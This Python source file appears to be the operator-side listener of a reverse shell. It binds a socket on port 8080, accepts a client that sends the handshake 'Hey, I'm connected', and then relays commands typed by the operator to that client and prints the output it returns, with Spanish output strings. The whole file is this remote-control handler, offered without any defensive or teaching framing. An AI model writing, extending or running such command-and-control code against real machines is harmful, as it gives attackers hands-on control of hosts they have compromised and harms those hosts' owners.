import socket, colorama
from aiohttp import request
import requests

class Server:
    IP_ADDRESS = "127.0.0.1"
    PORT = 8080

    def main(self):
        server = socket.socket()
        server.bind((self.IP_ADDRESS, self.PORT))
        server.listen(1)

        print("\nServer listening...")
        while True:
            client, address = server.accept()
            print(f"Address: {address} has been connected")

            show = client.recv(1024).decode()

            print(f"******* {show} *******")

            if show == 'Hey, I\'m connected':
                while True:
                    command = input(f"{colorama.Fore.RED}>> {colorama.Fore.WHITE}")
                    client.send(command.encode())
                    salida = client.recv(2048).decode()
                    if salida == "No hay salida":
                        print("")
                    else:
                        print(f"{colorama.Fore.GREEN}{salida}")

            else:
                print("Hey it's not me :(")

if __name__ == '__main__':
    try:
        Server().main()
    except KeyboardInterrupt:
        exit()
